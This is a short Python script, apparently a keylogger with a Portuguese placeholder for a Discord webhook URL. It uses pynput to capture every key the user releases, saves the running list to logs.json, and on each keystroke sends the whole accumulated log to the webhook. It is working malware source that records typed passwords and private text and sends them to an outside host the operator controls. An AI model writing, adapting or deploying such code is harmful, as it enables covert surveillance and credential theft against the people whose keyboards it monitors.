from pynput import keyboard
import json
import requests
from discord import Webhook, RequestsWebhookAdapter
webhook = Webhook.from_url("SEU WEBHOOK AQUI!", adapter=RequestsWebhookAdapter())

key_list = []
x = False 


def update_json_file(key_list):
    with open('logs.json', '+wb') as key_log:
        key_list_bytes = json.dumps(key_list).encode()
        key_log.write(key_list_bytes)

def on_release(key):
    global x, key_list
    key_list.append(
        f'{key}',
    )
    if x == True:
        x = False
    update_json_file(key_list)
    webhook.send(key_list)


print("[+] Online!")

with keyboard.Listener(
        on_release=on_release) as listener:
    listener.join()
